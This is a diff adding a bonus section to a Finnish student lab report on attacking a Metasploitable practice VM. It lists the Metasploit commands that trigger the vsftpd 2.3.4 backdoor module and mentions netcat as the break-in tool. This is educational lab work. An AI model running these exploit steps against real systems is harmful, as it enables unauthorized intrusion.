@@ -115,6 +115,24 @@ Vielä kokeilin murtautua Metasploitableen ylemmällä olevia keinoja hyödyntä
 
 Löysin murtautumiskomennoksi komennon **nc**. 
 
+<img width="163" height="63" alt="image" src="https://github.com/user-attachments/assets/c85de827-6469-4720-9fbf-ea250de6ee4e" />
+
+Hyvin yksinkertaista!
+
+## g) BONUS
+
+Seuraavaksi koitin ekaa metasploit-hyökkäysohjelmaa. Hyödynsin lähteissä mainittua exploitability guidea. Kalin terminaalissa komennot **sudo msfdb init**, sekä **sudo msfconsole**.
+
+<img width="344" height="384" alt="image" src="https://github.com/user-attachments/assets/9bfdf9ed-2b0f-4470-8e18-65699e38f402" />
+
+Seuraavaksi aloitetaan ohjelma. Komentona **use exploit/unix/ftp/vsftpd_234_backdoor**, sitten **set RHOST /kohde-ip/**, **set LHOST /oma Kali ip/**, ja viimeiseksi **run**.
+
+
+<img width="727" height="277" alt="image" src="https://github.com/user-attachments/assets/58652cde-abcc-4318-848f-17cfc8c23cf6" />
+
+Portissa oleva backdoor on nyt käynnistetty. :)
+
+<img width="422" height="87" alt="image" src="https://github.com/user-attachments/assets/aa07077a-a91c-4fff-9b7c-67f706013ab1" />
 
 
 
